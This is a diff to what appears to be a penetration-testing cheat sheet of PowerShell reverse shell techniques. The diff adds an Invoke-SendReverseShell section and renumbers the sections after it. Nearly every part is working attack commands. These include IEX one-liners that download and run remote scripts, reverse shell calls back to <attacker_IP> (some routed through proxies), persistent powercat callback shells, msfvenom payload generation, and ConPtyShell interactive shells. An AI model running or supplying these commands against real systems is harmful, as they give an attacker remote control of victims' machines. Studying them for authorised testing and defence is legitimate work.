@@ -76,7 +76,31 @@ PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com
 Invoke-PowerShellIcmp -IPAddress <attacker_IP>
 ```
 
-## 05 - Generate via `powercat`
+## 05 - `Invoke-SendReverseShell`
+
+```
+PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Arno0x/PowerShellScripts/refs/heads/master/Invoke-SendReverseShell.ps1')
+```
+
+Direct connection.
+
+```
+PS C:\> Invoke-SendReverseShell -DestHost <attacker_IP> -DestPort <attacker_PORT>
+```
+
+Connection through system's default proxy.
+
+```
+PS C:\> Invoke-SendReverseShell -DestHost <attacker_IP> -DestPort <attacker_PORT> -UseDefaultProxy
+```
+
+Connection through manually specified proxy
+
+```
+PS C:\> Invoke-SendReverseShell -DestHost <attacker_IP> -DestPort <attacker_PORT> -ProxyName <HTTP_proxy_IP> -ProxyPort <HTTP_proxy_PORT>
+```
+
+## 06 - Generate via `powercat`
 
 Generate reverse shell.
 
@@ -96,9 +120,9 @@ Persist callback shell.
 > powercat -c <IP> -p <PORT> -e cmd.exe -rep
 ```
 
-## 06 - Generate via `msfvenom`
+## 07 - Generate via `msfvenom`
 
-### 6.1 - x86 (32-bit) Payloads
+### 7.1 - x86 (32-bit) Payloads
 
 ```
 $ msfvenom -p cmd/windows/reverse_powershell lhost=<IP> lport=<PORT> -f raw -o implant.bat
@@ -112,7 +136,7 @@ $ msfvenom -p cmd/windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MO
 $ msfvenom -p windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell.ps1
 ```
 
-### 6.2 - x86-64 (64-bit) Payloads
+### 7.2 - x86-64 (64-bit) Payloads
 
 You can load powershell scripts ahead of time.
 
@@ -120,11 +144,11 @@ You can load powershell scripts ahead of time.
 $ msfvenom -p windows/x64/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell-x64.ps1
 ```
 
-## 07 - Fully Interactive PowerShell
+## 08 - Fully Interactive PowerShell
 
 ^d57486
 
-### 7.1 - Method One
+### 8.1 - Method One
 
 This will set the terminal size automatically without passing the `rows` and `cols` manually.
 
@@ -132,7 +156,7 @@ This will set the terminal size automatically without passing the `rows` and `co
 PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <attacker_IP> <attacker_PORT>
 ```
 
-### 7.2 - Method Two
+### 8.2 - Method Two
 
 When you encounter an problem to ensure that the `cols` and `rows` are set manually. Here you should use the values read from `stty size` command in the Parameters `-Rows` and `-Cols`
 
@@ -140,7 +164,7 @@ When you encounter an problem to ensure that the `cols` and `rows` are set manua
 PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp <attacker_IP> -RemotePort <attacker_PORT> -Rows <rows> -Cols <columns>
 ```
 
-### 7.3 - Method Three
+### 8.3 - Method Three
 
 Here you should use the values read from `stty size` command in the Parameters `-Rows` and `-Cols`.
 
@@ -155,9 +179,11 @@ PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master
 
 - [MrPineMan: Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)
 
-- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
+- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
 
 - [samratashok: Nishang](https://github.com/samratashok/nishang)
+
+- [Arno0x: PowerShellScripts](https://github.com/Arno0x/PowerShellScripts)
 
 - [Powercat](https://github.com/besimorhino/powercat)
 
